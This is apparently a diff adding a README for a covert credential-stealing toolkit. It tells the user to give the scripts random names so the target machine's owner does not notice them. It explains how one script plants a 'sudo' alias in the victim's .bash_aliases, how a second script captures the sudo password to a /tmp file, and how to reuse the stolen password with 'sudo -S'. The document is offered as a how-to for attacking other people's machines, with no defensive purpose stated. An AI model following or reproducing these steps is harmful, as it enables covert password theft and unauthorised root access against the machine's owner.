@@ -1,0 +1,12 @@
+### BEFORE USING THESE SCRIPTS ####
+*-> change their names to a random file name in order to the machine's owner does not realize it is a malicious script.
+
+######
+
+1-> run the to.sh script on the target machine, it will add a "sudo" alias inside the .bash_aliases file of the target machine
+   1.1-> then, when the to.sh has been succesfully executed, whenever the target write "sudo <randomcommand>" on his machine's terminal \
+         it will not execute the real sudo, instead, it will execute the get_parameters.sh file, in which will capture the sudo password
+   2-> then, you just have to ```cat /tmp/content_extra_file ``` to be able to see the -> username : sudo_password
+   
+   FINAL -> whenever you want to run a sudo command on the target machine, remember to run as follows:
+            -> "echo '<sudo_password>' | sudo -S <command>" (without the double quotes)
